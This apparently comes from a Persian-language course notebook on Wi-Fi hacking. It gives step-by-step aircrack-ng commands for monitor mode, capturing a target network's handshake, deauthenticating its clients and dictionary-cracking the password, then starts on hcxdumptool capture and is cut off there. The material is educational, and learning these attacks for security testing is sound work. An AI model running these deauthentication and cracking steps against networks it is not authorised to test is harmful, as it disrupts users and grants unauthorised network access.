---
Episode: E37 to E41
Date: 2024-07-06
Is Finished?: true
Practice Primary: true
Practice Secondary: 
Time: 42:00
tags:
  - CyberSecurity
  - hacking
Category: Cyber Security
banner: 
Home: "[[Table of Content - Hacking & Security]]"
Pervious Episode: "[[E32 to E36 (Cracking Compresses & Offices - Part3)]]"
Next Episode: "[[E42 to E44 - (Automated Wifi Hacking - Part 2)]]"
---
-------
## E37 to E41 - (Wifi Hacking - Part 1)
- [Additional Wordlists](#Additional%20Wordlists)
- [Introduction to WIFI Hacking - E37](#Introduction%20to%20WIFI%20Hacking%20-%20E37)
	- [Briefly Describe of Module](#Briefly%20Describe%20of%20Module)
	- [How Wifi Works?](#How%20Wifi%20Works?)
	- [Wifi Security](#Wifi%20Security)
	- [Terminology of WIFI](#Terminology%20of%20WIFI)
	- [Wireless Channels](#Wireless%20Channels)
	- [Monitor Mode & Packet Injection](#Monitor%20Mode%20&%20Packet%20Injection)
	- [Basic Wifi Password Cracking Techniques](#Basic%20Wifi%20Password%20Cracking%20Techniques)
- [Hacking WIFI(WPA/WPA2) Network with `Aircrack Suite` - E38](#Hacking%20WIFI(WPA/WPA2)%20Network%20with%20%60Aircrack%20Suite%60%20-%20E38)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [What is Aircrack-ng?](#What%20is%20Aircrack-ng?)
		- [Concept of Usage](#Concept%20of%20Usage)
		- [Laboratory for WIFI Hacking](#Laboratory%20for%20WIFI%20Hacking)
		- [Four Way Handshake Basics](#Four%20Way%20Handshake%20Basics)
		- [Instruction Steps](#Instruction%20Steps)
			- [0. Requirements](#0.%20Requirements)
			- [1. Capturing Handshake - Phase 1 of Wifi Hacking](#1.%20Capturing%20Handshake%20-%20Phase%201%20of%20Wifi%20Hacking)
			- [2. Cracking Captured Handshake - Phase 2](#2.%20Cracking%20Captured%20Handshake%20-%20Phase%202)
		- [All Tools in Aircrack-ng Suite](#All%20Tools%20in%20Aircrack-ng%20Suite)
	- [Practical Demo](#Practical%20Demo)
		- [Attack Steps](#Attack%20Steps)
		- [Attack Scripts](#Attack%20Scripts)
- [1. Capturing Handshakes with `Hcxdumptool` - E39](#1.%20Capturing%20Handshakes%20with%20%60Hcxdumptool%60%20-%20E39)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [Definitions](#Definitions)
		- [What is `Hcxdumptool`](#What%20is%20%60Hcxdumptool%60)
		- [Instruction Steps](#Instruction%20Steps)
	- [Practical Demo](#Practical%20Demo)
- [2. Preparing Captured Handshakes for Hashcat - E40](#2.%20Preparing%20Captured%20Handshakes%20for%20Hashcat%20-%20E40)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [Basic & Concepts](#Basic%20&%20Concepts)
		- [Hashcat Vs Aircrack](#Hashcat%20Vs%20Aircrack)
		- [Converter Tool's](#Converter%20Tool's)
			- [What is `hcxpcapngtool` ?](#What%20is%20%60hcxpcapngtool%60%20?)
			- [What is `cap2hashcat`](#What%20is%20%60cap2hashcat%60)
		- [Instruction Steps](#Instruction%20Steps)
			- [Convert Handshakes Captured with `hcxdumptool` by `hcxpcapngtool` - Phase *1*](#Convert%20Handshakes%20Captured%20with%20%60hcxdumptool%60%20by%20%60hcxpcapngtool%60%20-%20Phase%20*1*)
			- [Convert Handshakes Captured with `Aircrack Suite` by `cap2hashcat` - Phase *2*](#Convert%20Handshakes%20Captured%20with%20%60Aircrack%20Suite%60%20by%20%60cap2hashcat%60%20-%20Phase%20*2*)
	- [Practical Demo](#Practical%20Demo)
			- [Convert Handshakes Captured with `hcxdumptool` by `hcxpcapngtool` - Phase *1*](#Convert%20Handshakes%20Captured%20with%20%60hcxdumptool%60%20by%20%60hcxpcapngtool%60%20-%20Phase%20*1*)
			- [Convert Handshakes Captured with `Aircrack Suite` by `cap2hashcat` - Phase *2*](#Convert%20Handshakes%20Captured%20with%20%60Aircrack%20Suite%60%20by%20%60cap2hashcat%60%20-%20Phase%20*2*)
- [3. Cracking Handshakes with `hashcat` -E41](#3.%20Cracking%20Handshakes%20with%20%60hashcat%60%20-E41)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [Definition's](#Definition's)
		- [Cracking in the Cloud](#Cracking%20in%20the%20Cloud)
		- [Cloud Services](#Cloud%20Services)
			- [Google Collab](#Google%20Collab)
			- [Gradient](#Gradient)
			- [Pre-Built Labs in Google Collab for Cracking](#Pre-Built%20Labs%20in%20Google%20Collab%20for%20Cracking)
		- [Instruction Steps](#Instruction%20Steps)
			- [Cracking Handshakes in *Windows* Instruction](#Cracking%20Handshakes%20in%20*Windows*%20Instruction)
			- [Cracking Handshakes in Cloud with *Google Collab* Instruction](#Cracking%20Handshakes%20in%20Cloud%20with%20*Google%20Collab*%20Instruction)
			- [Cracking Handshakes in Cloud with *Gradient* Instruction](#Cracking%20Handshakes%20in%20Cloud%20with%20*Gradient*%20Instruction)
	- [Practical Demo](#Practical%20Demo)
		- [Cracking Handshakes in *Windows* Instruction](#Cracking%20Handshakes%20in%20*Windows*%20Instruction)
		- [Cracking Handshakes in Cloud with *Google Collab* Instruction](#Cracking%20Handshakes%20in%20Cloud%20with%20*Google%20Collab*%20Instruction)
		- [Cracking Handshakes in Cloud with *Gradient* Instruction](#Cracking%20Handshakes%20in%20Cloud%20with%20*Gradient*%20Instruction)
*******
### Additional Wordlists
1. https://weakpass.com
2. https://github.com/danielmiessler/SecLists/tree/master/Passwords
3. https://labs.nettitude.com/tools/rocktastic/
4. https://github.com/kennyn510/wpa2-wordlists/tree/master/Wordlists
### Introduction to WIFI Hacking - E37
#### Briefly Describe of Module
در این ماژول یعنی Wifi Hacking به مباحث زیر میپردازیم:
1. Wifi Basics
2. WPA2 Hacking
3. Popular tools for Hack & Crack Wifi Passwords
4. Hacking WIFI on Windows
5. *Slide*
	1. ![[Pasted image 20240705162232.png]]
#### How Wifi Works?
- شبکه های Wireless همان *Wifi* از سیگنال های رادیویی مانند سیگنال موبایل که *GSM* نامیده میشود، برای برقراری ارتباطات خود استفاده میکنند.
- کارت های شبکه وایرلس *Wireless Adapter Cards* که در اکثر ماشین ها از جمله کامپیوتر ها و موبایل های هوشمند یافت میشود، وظیفه آماده کردن داده برای ارسال یعنی تبدیل داده به سیگنال رادیویی را دارند. 
- پس از تبدیل داده به سیگنال، سیگنال تولید شده از طریق *Wireless Antena* برای نقطه مقصد فرستاده میشود.
- در نقطه مقصد، یک *Router* یا تجهیز دیگری سیگنال های ارسال شده را دریافت میکند و سپس آنها را به نوبت *Decode* میکند تا بتواند داده هایی که از طریق اینترنت برای او فرستاده شده اند را در شبکه *LAN* خود و یا *WAN* خود برای کاربران خود به اشتراک بگذارد.
- *اسلاید*
	- ![[Pasted image 20240705162914.png]]
#### Wifi Security
سه استاندارد رسمی که برای رمزنگاری و افزایش امنیت شبکه های وایرلسی استفاده میشود، عبارتند از:
1. *WEP* => Not Used Anymore - Algorithm Cracked
2. *WPA/WP2* => 99% Devices use this
3. *WPA3* => Newest & Safest Standard => Algorithm Not Cracked Yet
4. *Slide:*
	1. ![[Pasted image 20240705163243.png]]
#### Terminology of WIFI
1. *AP*(Access Point) => Wifi Router
	1. ![[Pasted image 20240705163434.png]]
2. *MAC*(Media Access Control) => Unique ID Assign to Wireless Adapters & Routers(48bit)
	1. ![[Pasted image 20240705163533.png]]
3. *ESSID*(Access Point Broadcast Name) => (*ie* YakuzaHome5g, YakuzaCAP, ....)
	1. بعضی از App ها ممکن است برای کار کرد خود SSID بسازند که این SSID نام Broadcast Name نداشته باشند و یا Hidden SSID باشند، در اینجا ابزارهای Wireless Hacking میتوانند آنها را شناسایی کنند و نمایش دهند.
		1. ![[Pasted image 20240705163857.png]]
4. *BSSID*(Access Point MAC Address)
#### Wireless Channels
دیوایس های وایرلسی یا هر SSID بر روی یک کانال خاص سیگنال خود را تولید میکنند. این سیگنال ها را میتوانیم در تصویر زیر مشاهده کنیم:
	![[Pasted image 20240705164056.png]]
- در واقع شبکه های وایرلسی در دو فرکانس 2.4GHZ و 5GHz و جدیدا هم 6Ghz میتوانند کار میکنند. کانال هایی که میتوان در هر باند فرکانسی از آنها استفاده کرد بر طبق قانون هر کشور کمی متفاوت میباشد اما بصورت کلی مانند زیر است *>>*
- کانال های استاندارد برای شبکه های وایرلسی در باند *2.4* کانال های *1 الی 14*در آمریکا، ژاپن و *1 الی 13* در سایر کشور ها هستند.
	- ![[Pasted image 20240705164500.png]]
- همانطور که در تصویر هم مشاهده کردیم کانال های باند 2.4 در تداخل Collision با یکدیگر قرار داند در حالیکه در باند 5Ghz بدلیل اینکه کانال ها بر روی یکدیگر قرار دارند و نه در کنار همدیگر، کانال ها هیچ تداخلی با یکدیگر ندارند.
#### Monitor Mode & Packet Injection
بصورت پیشفرض، کارت شبکه وایرلس فقط به ترافیک هایی که به سمت او ارسال میشوند گوش میدهید(Listening میکند)
- اما هنگامیکه کارت شبکه را به حالت *Monitor Mode* میبریم، این کارت وایرلس تمام ترافیک هایی که در محدوده شعاع آنتن دهی خود است را Listen میکند.
- بوسیله ویژگی بنام Packet Injection هم میتوانیم بسته های مشخصی را به اکسس پوینت AP تزریق  Inject کنیم که اینکار در حمله های پیشرفته وایرلسی بسیار استفاده میشود.
> نکته اینجاست که تمام کارت های وایرلسی از ویژگی Listening Mode پشتیبانی نمیکند و فقط کارت های شبکه مخصوصی مانند Alpha Wireless Card و یا TP-Link TL-WN722N از این Listening Mode پشتیبانی میکنند.
- *اسلاید*:
	- ![[Pasted image 20240705165125.png]]
همانطور که گفتیم، یکی از کارت های شبکه وایرلس که قابلیت Listening Mode را پشتیبانی میکند کارت شبکه وایرلس اکسترنال `TL-WN722N` از `TP-Link` است که بسیار هم مورد استفاده میباشد؛ استفاده از کارت های وایرلسی External هم در عملیات کرک شبکه های وایرلسی پیشنهاد میشود زیرا میتوان از آنها در ماشین مجازی Kali بصورت مستقل استفاده کرد.
	![[Pasted image 20240705165408.png]]
#### Basic Wifi Password Cracking Techniques
1. *Brute Force*
	1. در این روش یکسری کاراکتر هایی را مشخص میکنیم که با استفاده از آنها به کرک پسورد شبکه وایرلسی بپردازیم.
2. *Dictionary*
	1. در این حملات هم از یک Wordlist خارجی برای یافتن پسورد استفاده میکنیم.

> میخواهیم دو حمله *Brute Force* و *Dictionary* را در یک حمله واقعی مقایسه کنیم:

در یکی از حملات رایج، یکی از محققان امنیتی شرکت Cyber ARK به تمامی شبکه های وایرلسی در تل آویو با استفاده یک کارت شبکه ` AWUS036ACH ALFA` انجام گرفت، محققان توانستند مقدار 70 درصد از هش پسورد شبکه های وایرلس، یعنی حدود *5000 هش پسورد* شبکه های وایرلسی را بدست آورند.
*پس از آن محققان برای کرک این Hash ها از حملات زیر استفاده کردند >>*
1.  تعداد *1359* عدد از آنها را بوسیله *Dictionary Attack* با *Rockyou* کرک کرد.
2. تعداد *2000* عدد پسورد را نیز بوسیله *Masking Attack* در ترکیب با *Dictionary* بدست آورد. 
3. در تصویر زیر خلاصه از شرح این حمله را میتوان مشاهده کرد:
	- ![[Pasted image 20240705170014.png]]
4. *اسلاید*:
	1. ![[Pasted image 20240705170731.png]]
طبق این تحقیق عملی، انجام حمله `Masking Attack Combination With Dictionary` بهترین نتیجه را میتواند داشته باشد. همچنین بهترین نوع حملات Brute Force هم `Brute Force with Mask` نام دارد.
### Hacking WIFI(WPA/WPA2) Network with `Aircrack Suite` - E38
#### Definition & Instruction
##### What is Aircrack-ng?
یک مجموعه از ابزار های کامل برای انجام فرآیند Wifi Hacking است، این مجموعه از فرآیند اول Wifi Hacking یعنی Sniffing یا شنود تا انتها Cracking یعنی کرک پسورد را میتواند انجام دهد.  برای هر یک از این مراحل از Wifi Hacking، ابزار های مخصوصی در این مجموعه ابزار وجود دارد، 
*در واقع از این جعبه ابزار در مقاصد زیر میتوانیم استفاده کنیم*:
1. *Monitoring* => `airmon-ng` & `airodump-ng`
	1. شنود پکت های وایرلسی، استخراج Handshake از پکت های شنود شده و ذخیره آن در یک فایل `cap*.`
2. *Attacking* => `airepaly-ng` | `airbase-ng` | `Airserv-ng`
	1. انجام انواع حملات مانند Replay Attack, Deauthentication, Fake AP, .... با استفاده از Packet Injection از توانایی های ابزار بشمار میرود.
3. *Testing* => `Packetforge-ng` | `Besside-ng` | `Easside-ng`
	1. تست کارت های شبکه و درایور های آنها با Capturing و یا Injection پکت به کارت شبکه
4. *Cracking* => `aircrack-ng` | `Airdecap-ng` | `Dcrack`
	1. در نهایت هم میتوانیم فایل `cap*.` کپچر شده که Handshake درون آن وجود دارد را بوسیله ابزار کرک کنیم. 
	2. پسورد های شبکه های وایرلسی  از الگوریتم های WEP, WPA PSK(WPA1, WPA2) برای Encryption استفاده میکنند، در نتیجه در Handshake مقادیر هش شده این الگوریتم ها وجود دارد که باید کرک شود.
5. Slide
	1. ![[Pasted image 20240705174032.png]]
> برای انجام تمام مراحل بالا میتوانیم از Aircrack-ng استفاده کنیم.
##### Concept of Usage 
برای هک شبکه های وایرلسی باید مراحل زیر را انجام دهیم >>
1. Setup wlan0 on Monitor Mode with `airmon-ng`
2. Capture Four 4 Way Handshake with `airodump-ng`
3. Crack Handshake with `aircrack-ng` in *Dictionary* or *Brute Force* Attack
4. *Slide*:
	1. ![[Pasted image 20240705174520.png]]
##### Laboratory for WIFI Hacking
4. Pre-Pare Laboratory for Wifi Hacking
	1. We need Kali Linux *Recommended* or Parrot Sec on VM 
	2. or Run Kali Natively in Windows WSL2
برای استفاده از این ابزار هم نیازمند یک ماشین Kali و یا Parrot SEC هستیم. حال میتوانیم آنرا در VM استفاده کنیم و یا هم میتوانیم آنرا در ویندوز WSL2 استفاده کنیم.
##### Four Way Handshake Basics
هنگامیکه کلاینت میخواهد به یک AP متصل شود >>
1. کاربر برای اتصال باید یک Pre-Shared Key که در واقع پسورد SSID است را در موبایل یا لپ تاپ خود وارد کند تا بتواند به SSID متصل شود.
2. هنگامیکه دیوایس به SSID متصل شد، دیوایس از این پسورد برای ساخت یک Session Key استفاده میکند.
3. *به انجام این فرآیند ها میان کلاینت و سرور(SSID)، به اصطلاح Four Way Handshake گفته میشود که در این فرآیند پارامتر های احراز هویت کلاینت برای SSID رد و بدل میشود.*
4. از این Session Key برای رمزنگاری ارتباطات و داده های رد و بدل شده(Communication) در شبکه Wifi استفاده میشود.
5. *اسلاید*:
	1. ![[Pasted image 20240705175308.png]]
> بنابراین اگر بتوانیم Four Way Handshake را Capture کنیم، میتوانیم با کرک آن به پسورد شبکه Wifi برسیم.
##### Instruction Steps
###### 0. Requirements
0. Pre-Pare Laboratory 
1. Pre-Pare a USB Wireless Card that Support Monitoring Mode
2. Download Aircrack for using in windows, Or Using Aircrack in Kali Linux by Default.
###### 1. Capturing Handshake - Phase 1 of Wifi Hacking
بصورت پیشفرض کارت شبکه وایرلس فقط ترافیک هایی که به سمت او می آیند را برمیدارد. هنگامیکه کارت شبکه را به حالت Monitor Mode میبریم کارت شبکه تمام ترافیک هایی که در محدوده و شعاع خود هستند را میتواند دریافت کند.
	1. ![[Pasted image 20240705180141.png]]
بنابراین در قدم اول باید کارت شبکه را به حالت Monitoring ببریم تا بتوانیم تمام ترافیک های اطراف را شنود کنیم.
1. *Put your Wifi Card in Monitor Mode with `airmon-ng`*
	1. `iwconfig` Check Existing Wifi Adapters
		1. ![[Pasted image 20240705180443.png]]
	2. `sudo airmon-ng start wlan0` Put Wifi Card on Monitor mode
		1. ![[Pasted image 20240705180635.png]]
	3. `iwconfig` Now *wlan0* Changed to *waln0mon* which Say Wlan0 on Monitor Mode
		1. ![[Pasted image 20240705180738.png]]
2. *Capture All wifi traffic with `airodump-ng`*
	1. حال که کارت شبکه در حالت Monitoring Mode است میتوانیم تمام ترافیک های وایرلس اطراف را شنود کنیم. اطلاعاتی که این ابزار به ما میدهد شامل BSSID, Chanel, Speed, Encryption, ESSID or SSID شبکه های وایرلسی میشود.
		1. ![[Pasted image 20240705181129.png]]
	2. `airodump-ng wlan0mon`
		1. ![[Pasted image 20240705181230.png]]
	3. حال در این مرحله اطلاعات SSID تارگت که میخواهیم کرک کنیم از جمله `Channel, BSSID` را بر میداریم تا در مرحله بعدی فقط اطلاعات این SSID را کپچر کنیم.
3. *Capture the related(target) traffic of your AP with `airodump-ng`*
	1. حال باید ترافیک های AP تارگت را کپچر کنیم تا Four Way Handshake را بدست بیاوریم.
		1. ![[Pasted image 20240705181838.png]]
	2. `airodump-ng -c 6 --bssid C0:f6:B1:00:31:A0 -w pass wlan0mon`
		1. `-c` مشخص کرن کانال وایفای تارگت
		2. `--bssid` مشخص کردن مک آدرس تارگت
		3. `-w pass` نام فایل
		4. Image
			1. ![[Pasted image 20240705182029.png]]
	3. ابزار airodump-ng به شنود ترافیک های AP وارد شده میپردازد، ترمینال شنود را minimize میکنیم و یک ترمینال جدید باز میکنیم تا حمله Deauthentication را انجام دهیم.
4. *Deauthentication the wireless clients with `aireplay-ng`*
	1. حال باید با استفاده از حمله Deauthentication کاری کنیم که کاربر از AP فعلی Disconnect شود و سپس مجبور شود به AP Fake که میسازیم و کاملا مشابه AP فعلی اوست متصل شود. در اتصال مجددا کاربر باید Pre-Shared Key را وارد کند که در اینجا میتوانیم Four Way Handshake Basics را Capture کنیم.
	2. `aireplay-ng -0 100 -a C0:f6:B1:00:31:A0 wlan0mon`
		1. `-0` Means Deauthentication
		2. `100` the number of Deauthentication Packets
		3. `-a` Specify AP Mac Address
		4. `wlan0mon` the Interface Name
		5. Image
			1. ![[Pasted image 20240705182627.png]]
	3. به محض اجرای حمله تعداد 100 بسته برای کلاینت فرستاده میشود و کلاینت از اکسس پوینت Disconnect میشود.
	4. ممکن است تعداد 100 بسته کم باشد بنابراین میتوانیم حمله را با تعداد بیشتری بسته انجام دهیم.
5. *Now Back to `Terminal-1` and we can see `Captured Handshake`*
	1. حال اگر به ترمینال اول که در حال شنود AP بود بر گردیم میتوانیم مشاهده کنیم که Four Way Handshake با موفقیت Capture شده است.
		1. ![[Pasted image 20240705183131.png]]
	2. هنگامیکه `WPA Handshake` را در گوشه بالا سمت راست ترمینال مشاهده میکنیم به معنای این است که Handshake با موفقیت Capture شده است، بنابراین پس از مشاهده عبارت `WPA Handshake` در گوشه بالا سمت راست، میتوانیم با `CTRL+C` از شنود خارج شویم تا به مرحله کرک Handshake برویم.
	3. اطلاعات `Handshake` کپچر شده را در فایل `pass.cap` میتوانیم مشاهده کنیم. این فایل را در هنگام استارت شنود بر روی AP تارگت، در مقابل فلگ `w-` معرفی کردیم. 
	4. برای کرک هم باید از همین فایل استفاده کنیم.
----
```sh Terminal-1
"1. Check Existing Wifi Adapters"
iwconfig 
"2. Put Wifi Card on Monitor mode"
sudo airmon-ng start wlan0
"3. Capture all wifi traffics"
airodump-ng wlan0-mon
"4. Capture the related(target) traffic of your AP"
airodump-ng -c 6 --bssid C0:f6:B1:00:31:A0 -w pass wlan0mon

```
	![[Pasted image 20240705181309.png]]
	![[Pasted image 20240705182016.png]]
----
```sh Terminal-2
"5. Deauthentication the wireless clients from Target AP"
aireplay-ng -0 100 -a C0:f6:B1:00:31:A0 wlan0mon
```
	![[Pasted image 20240705182819.png]]
###### 2. Cracking Captured Handshake - Phase 2
0. *Pre-Pare Wordlist*
	1. در واقع میتوان گفت درصد و ضریب موفقیت در کرک پسورد به Wordlist که در حمله از آن استفاده میکنیم بستگی دارد.
	2. میتوانیم از Wordlist جامع Rockyou برای کرک استفاده کنیم که اگر فشرده است باید آماده شود.
		1. ![[Pasted image 20240705184838.png]]
	3. همچنین اگر پسورد مورد نظر در حمله با Rockyou کرک نشد، میتوانیم از Wordlist های زیر استفاده کنیم:
		1. https://weakpass.com
		2. https://github.com/danielmiessler/SecLists/tree/master/Passwords
		3. https://labs.nettitude.com/tools/rocktastic/
		4. https://github.com/kennyn510/wpa2-wordlists/tree/master/Wordlists
		5. *Slide*
			1. ![[Pasted image 20240705185203.png]]
1. *Cracking Wifi Password with `aircrack-ng` in Dictionary Attack Using Rockyou*
	1. این حمله را به دو روش میتوانیم انجام دهیم:
	2. `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b C0:f6:B1:00:31:A0 pass*.cap`
		1. `-w` Define Wordlist
		2. `-b` | `--bssid` Define Target Mac Address
		3. `pass*.cap` this is a Packet file where captured handshake is stored.
		4. Image
			1. ![[Pasted image 20240705184144.png]]
	3. `aircrack-ng -w /usr/share/wordlists/rockyou.txt pass*.cap`
		1. ![[Pasted image 20240705184552.png]]
	4. در واقع وارد کردن *BSSID(`-b`)* اختیاری است و برای افزایش کیفیت(در واقع دقت) حمله استفاده میشود.
2. Cracking Done and we can see wireless password in terminal
	1. ![[Pasted image 20240705184639.png]]
---
```sh
"6. Cracking Handshake pass*.cap"
#Way 1
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b C0:f6:B1:00:31:A0 pass*.cap
#Way 2
aircrack-ng -w /usr/share/wordlists/rockyou.txt pass*.cap 
```
	![[Pasted image 20240705184639.png]]
##### All Tools in Aircrack-ng Suite
1. **Aircrack-ng**: The core tool of the suite, used to crack WEP and WPA/WPA2 passwords using various methods, including dictionary attacks, brute-force attacks, and PTW attacks.
2. **Aireplay-ng**: A tool used to inject packets into a wireless network, which can be used to test the security of the network or to crack WEP keys.
3. **Airodump-ng**: A tool used to capture and display information about wireless networks, including network names, MAC addresses, and encryption types.
4. **Airdecap-ng**: A tool used to decrypt WEP or WPA/WPA2 packets, which can be used to analyze network traffic or to crack passwords.
5. **Airmon-ng**: A tool used to put a wireless network interface into monitor mode, which is required for many of the other tools in the suite.
6. **Airserv-ng**: A tool used to create a fake access point, which can be used to test the security of wireless clients.
7. **Airtun-ng**: A tool used to create a virtual tunnel interface, which can be used to tunnel wireless traffic over a wired network.
8. **Packetforge-ng**: A tool used to forge packets, which can be used to test the security of wireless networks or to create custom packets for penetration testing.
9. **Besside-ng**: A tool used to automate the process of cracking WEP keys, making it easier to test the security of wireless networks.
10. **Easside-ng**: A tool used to automate the process of cracking WPA/WPA2 passwords, making it easier to test the security of wireless networks.
11. **Tkiptun-ng**: A tool used to tunnel traffic over a wireless network, which can be used to test the security of wireless networks or to create a backdoor into a network.
12. **Wesside-ng**: A tool used to crack WEP keys using a combination of attacks, including dictionary attacks, brute-force attacks, and PTW attacks.
13. **Dcrack**: A tool used to crack WPA/WPA2 passwords using a combination of attacks, including dictionary attacks, brute-force attacks, and PTW attacks.
14. **Hpools**: A tool used to manage a pool of WPA/WPA2 passwords, which can be used to crack passwords more efficiently.
15. **makeivs**: A tool used to create a dictionary of IVs (Initialization Vectors) for use with the aircrack-ng tool.
16. **Image**
	1. ![[Pasted image 20240707003440.png]]
#### Practical Demo
##### Attack Steps
0. `iwconfig` بررسی کارت وایرلس های موجود
1. `sudo airmon-ng start wlan0` بردن کارت شبکه به حالت مانیتورینگ
	1. هنگامیکه میخواهیم کارت شبکه وایرلس را به حالت Monitoring ببریم پیامی نشان داده میشود که میگوید؛ باید Process هایی که از Wireless Adapter استفاده میکنند را Kill کنید تا بتوانیم کارت شبکه را به حالت Monitoring ببریم.
		1. ![[Pasted image 20240705212918.png]]
	2. `sudo kill 1303 && sudo kill 1833`
	3. `sudo airmon-ng start wlan0` 
2. `sudo airodump-ng wlan0mon` دامپ کردن تمام ترافیک های وایرلسی
	1. حال میتوانیم تمام SSID ها و ترافیک های وایرلسی اطراف را شنود کنیم.
		1. ![[Pasted image 20240705213524.png]]
	2. به محض اجرای این کامند تمام SSID های اطراف را در قسمت بالا، به همراه کلاینت هایی که به آنها متصل هستند را در قسمت پایین، میتوانیم مشاهده کنیم.
		1. ![[Pasted image 20240705213739.png]]
	3. حال Channel و BSSID تارگت را برمیداریم تا بتوانیم فقط ترافیک های آن SSID را شنود کنیم.
		1. ![[Pasted image 20240705214014.png]]
3. `sudo airodump-ng -c 6 -bssid C0:F6:C2:5E:8D:20 -w pass wlan0mon` دامپ کردن ترافیک های اکسس پوینت تارگت
	1. با اجرای کامند، ابزار شروع به شنود SSID مورد نظر میکند. 
		1. ![[Pasted image 20240705214330.png]]
	2. پس از اجرای این کامند، فعلا کاری با این ترمینال نداریم و کافیست آنرا Minimize کنیم.
	3. این شنود را تا زمانی که handshake کپچر نشده است ادامه میدهیم. در گوشه بالا سمت راست میتوانیم Notification کپچر Handshake را مشاهده کنیم:
		1. ![[Pasted image 20240705214515.png]]
4. `sudo aireplay-ng -0 100 -a C0:F6:C2:5E:8D:20 wlan0mon` پیاده سازی حمله Deauthentication
	1. به محض اجرای کامند، حمله Deauthentication به SSID هدف انجام میشود تا در ترمینال اول که ابزار airodump-ng در حال Capture اطلاعات تارگت است بتواند Handshake تارگت را Capture کند.
		1. ![[Pasted image 20240705214842.png]]
	2. این حمله را تا زمانی انجام میدهیم که در Terminal-1 نوتیفیکیشن WPA Handshake Capture را مشاهده کنیم:
		1. ![[Pasted image 20240705214949.png]]
	3. حال Handshake که Capture شده است و در فایل `pass.*cap` قرار دارد را میتوانیم کرک کنیم تا پسورد شبکه وایرلسی را بدست بیاوریم.
5. *Cracking `pass.*cap` with 2 Attack* کرک پسورد در دو روش(حمله)
	0. اگر Wordlist Rockyou اماده نبود، باید آنرا ابتدا از حالت فشرده خارج کنیم.
		1. `locate rockyou` & `gunzip /usr/share/wordlists/rockyou.txt.gz`
			1. ![[Pasted image 20240705215306.png]]
	1. *Attack 1*
		1. `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b C0:F6:C2:5E:8D:20 pass*.cap`
			1. ![[Pasted image 20240705215645.png]]
	2. *Attack 2*
		1. `aircrack-ng pass.*cap -w /usr/share/wordlists/rockyou.txt`
	3. به محض اجرای هر کدام یک از این حملات ابزار شروع به کرک Handshake به همراه Wordlist معرفی شده میکند.
		1. ![[vlc_z3mQtNO5nw.gif]]
6. Cracking Successfully done and we can see Target Password in terminal
	1. ![[Pasted image 20240705215941.png]]
##### Attack Scripts
```sh Terminal-1 => Go wlan on Monitoring Mode & Capture Handshak
iwconfig

sudo airmon-ng start wlan0
#if wlan use process you should kill them
sudo kill 1303 && sudo kill 1833
iwconfig #Now waln0 change to wlan0mon

sudo airodump-ng wlan0mon #dump all wifi traffic to get target wifi channel and bssid
"Now we can Dumping Target SSID Traffics to capture Handshake"
sudo airodump-ng -c 6 --bssid C0:F6:C2:5E:8D:20 -w pass wlan0mon
```
-----
```sh Terminal-2 => Deauthentication Attack to capture Handshake
sudo aireplay-ng -0 100 -a C0:F6:C2:5E:8D:20 wlan0mon #Deauthentication Attack and airodump-ng Captured handshake in terminal-1
"After Attack go to Terminal-1 and Make sure the WPA-Handshake to be Captured, then go to next terminal for Cracking pass*.cap"
```
---
```sh Cracking Password
#Cracking Password - Attack 1
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b C0:F6:C2:5E:8D:20 pass.*cap
#Cracking Password - Attack 2
sudo aircrack-ng -w /usr/share/wordlists/rockyou.tx pass.*cap
```
### 1. Capturing Handshakes with `Hcxdumptool` - E39
#### Definition & Instruction
##### Definitions
*در روش دوم Wifi Hacking، عملیات Hacking را باید در سه فاز و مرحله انجام دهیم:*
1. ابتدا باید Handshake های SSID های اطراف، و یا SSID تارگت را Capture کنیم.
	1. `hcxdumptool`
2. سپس باید فایل Capture شده را از فرمت `cap.` و یا `pcapng.` به فرمتی(`hc22000.`) تبدیل کنیم، که بتوانیم آنرا با Hashcat کرک کنیم.
	1. `hcxpcapngtool`
	2. Online Tool `cap2hashcat` https://hashcat.net/cap2hashcat/
3. در آخر هم باید فایل Convert شده را بوسیله Hashcat کرک کنیم.
	1. `hashcat`
در این جلسه میخواهیم قدم اول را انجام دهیم، یعنی بوسیله ابزار `Hcxdumptool` به *Capturing* پکت های Handshake بپردازیم. 
پس از آن میخواهیم تفاوت کرک Handshake بوسیله Hashcat که از GPU برای کرک استفاده میکند را با کرک معمولی بوسیله Aircrack-ng را بررسی کنیم.
	![[Pasted image 20240706191943.png]]
- **Capturing Handshake**:
	- اولین و مهمترین قدم در کرک شبکه های وایرلسی بدست آوردن Handshake میباشد. ابزار `Hcxdumptool` متد دیگری را برای Capturing Handshake ارائه میدهد.
	- روش `Hcxdumptool` بوسیله توسعه دهندگان Hashcat توصیه میشود و از خروجی که این ابزار ارائه میدهد، در واقع Handshake کپچر شده، میتوانیم در `Hashcat` هم برای کرک استفاده کنیم.
	- در واقع در روش قبلی بوسیله `airodum-ng` پکت های را کپچر میکردیم و بوسیله `aircrack-ng` آنرا کرک میکردیم، اما در این روش با استفاده از `Hcxdumptool` کپچر را انجام میدهیم و با `Hashcat` به کرک Handshake میپردازیم.
	- *اسلاید*:
		- ![[Pasted image 20240706192411.png]]
##### What is `Hcxdumptool`
یکی از بهترین و آسانترین روش ها برای Capturing Handshake استفاده از ابزار `Hcxdumptool` میباشد. *مزیت های این ابزار عبارتند از >>*
1. برای Capturing Handshake با استفاده از `Hcxdumptool` نیازی به حمله `Deauthentication` نداریم.
2. بوسیله این ابزار میتوانیم Handshake های تمام SSID های اطراف را بصورت *Bulk* دسته جمعی Capture کنیم و فرآیند هک را بصورت دسته جمعی Bulk انجام دهیم.
3. *اسلاید*:
	1. ![[Pasted image 20240706193514.png]]
##### Instruction Steps
0. *Pre-Requires*
	1. Pre-Pare Kali Linux on VMWare
	2. By default `Hcxdumptool` not installed on kali, so install this.
	3. `sudo apt update` 
	4. `sudo apt-get install hcxdumptool`
		1. ![[Pasted image 20240706193855.png]]
1. *Pre-Pare Wifi Adapter*
	1. `iwconfig` Check Wireless Adapters available now
	2. Stop Services used Wifi Adapter
		1. `sudo systemctl stop NetworkManager
		2. `sudo systemctl stop wpa_supplicant `
	3. After Handshake Captured(After Step 4), Start Network Service manually
		1. `sudo systemctl start NetworkManager`
	4. *Slide*:
